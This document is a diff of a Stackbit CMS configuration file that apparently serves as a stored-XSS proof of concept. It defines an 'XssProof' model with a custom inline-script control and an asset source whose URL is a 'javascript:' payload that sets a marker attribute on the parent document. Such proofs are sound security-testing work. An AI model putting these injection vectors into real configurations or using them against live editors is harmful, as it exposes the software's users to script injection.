@@ -1,25 +1,45 @@
-export default {
+import { defineStackbitConfig } from '@stackbit/types';
+import { GitContentSource } from '@stackbit/cms-git';
+
+export default defineStackbitConfig({
   stackbitVersion: '~0.6.0',
-  ssgName: 'nextjs',
+  ssgName: 'custom',
+  nodeVersion: '18',
+  installCommand: 'npm install',
+  devCommand: 'node server.js --port {PORT} --hostname {HOSTNAME}',
+  buildCommand: 'npm run build',
+  publishDir: 'dist',
   contentSources: [
-    {
-      srcType: 'git',
-      srcProjectId: 'default',
-      rootPath: 'content',
+    new GitContentSource({
+      rootPath: __dirname,
+      contentDirs: ['content'],
       models: [
         {
-          type: 'data',
+          type: 'page',
           name: 'XssProof',
+          label: 'Stored XSS Proof',
+          urlPath: '/',
+          filePath: 'content/index.json',
           fields: [
             { name: 'title', type: 'string', required: true },
             { name: 'description', type: 'text' },
             { name: 'heroImage', type: 'image' },
-            { name: 'customControl', type: 'string', controlType: 'custom-inline-script', controlUrl: 'https://example.com/xss.js' }
+            {
+              name: 'customControl',
+              type: 'string',
+              controlType: 'custom-inline-script',
+              controlFilePath: 'custom-control.js'
+            }
           ]
         }
       ],
-      assets: { type: 'git', dirPath: 'assets' }
-    }
+      assetsConfig: {
+        referenceType: 'static',
+        staticDir: 'assets',
+        uploadDir: '.',
+        publicPath: '/assets/'
+      }
+    })
   ],
   assetSources: [
     {
@@ -28,4 +48,4 @@ export default {
       url: "javascript:(()=>{parent.document.documentElement.setAttribute('data-create-asset-xss','confirmed');return '<!doctype html><body>safe marker</body>'})()"
     }
   ]
-};
+});
